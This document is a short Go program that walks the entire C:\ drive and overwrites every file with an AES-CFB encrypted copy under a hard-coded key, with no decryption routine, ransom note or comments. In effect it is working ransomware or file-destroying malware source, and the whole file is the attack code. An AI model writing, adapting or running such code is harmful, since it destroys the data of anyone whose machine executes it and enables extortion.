package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"log"
	"os"
	"path/filepath"
)

func main() {
	var allfiles []string = ListAll("C:\\")
	key := []byte("'5;x~Eq=TjPAX-0KB`9(b<opvS:2O/4M")
	for i := 0; i < len(allfiles); i++ {
		block, err := aes.NewCipher(key)
		if err != nil {
			panic(err)
		}
		plaintext, err := os.ReadFile(allfiles[i])
		if err != nil {
			panic(err)
		}
		ciphertext := make([]byte, aes.BlockSize+len(plaintext))
		iv := ciphertext[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			panic(err)
		}
		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
		os.WriteFile(allfiles[i], ciphertext, 0777)
	}
}
func ListAll(path string) (paths []string) {
	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
		if err != nil {
			log.Println(err)
			return filepath.SkipDir
		}
		if !info.IsDir() {
			paths = append(paths, fullpath)
		}
		return nil
	})
	return paths
}